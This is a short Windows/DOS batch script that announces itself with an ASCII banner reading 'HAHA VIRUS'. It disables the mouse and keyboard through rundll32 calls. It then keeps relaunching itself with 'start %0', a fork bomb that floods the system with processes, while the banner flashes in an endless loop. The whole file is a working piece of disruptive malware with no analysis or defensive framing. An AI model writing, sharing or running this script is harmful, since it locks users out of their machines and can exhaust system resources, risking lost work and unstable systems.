@echo off
cls
:start
c:\windows\rundll32.exe mouse,disable
c:\windows\rundll32.exe keyboard,disable
start %0 /M
goto haha1
:haha1
echo HH      HH     AAAAAA     HH      HH     AAAAAA     HH      HH     AAAAAA 
echo HH      HH    AA    AA    HH      HH    AA    AA    HH      HH    AA    AA 
echo HHHHHHHHHH   AAAAAAAAAA   HHHHHHHHHH   AAAAAAAAAA   HHHHHHHHHH   AAAAAAAAAA 
echo HHHHHHHHHH  AAAAAAAAAAAA  HHHHHHHHHH  AAAAAAAAAAAA  HHHHHHHHHH  AAAAAAAAAAAA 
echo HH      HH AA          AA HH      HH AA          AA HH      HH AA          AA 
echo HH      HHAA            AAHH      HHAA            AAHH      HHAA            AA 
echo.
echo VV        VV () RRRR   UU       UU   SSSSS  
echo  VV      VV     RR RR  UU       UU SS
echo   VV    VV   II RRRR   UU       UU   SS
echo    VV  VV    II RR RR   UU     UU       SS
echo     VVVV     II RR  RR   UUUUUUU   SSSSS
:haha2
TYPE NUL | CHOICE.COM /N /CY /TY,1 >NUL
cls
TYPE NUL | CHOICE.COM /N /CY /TY,1 >NUL
goto haha1
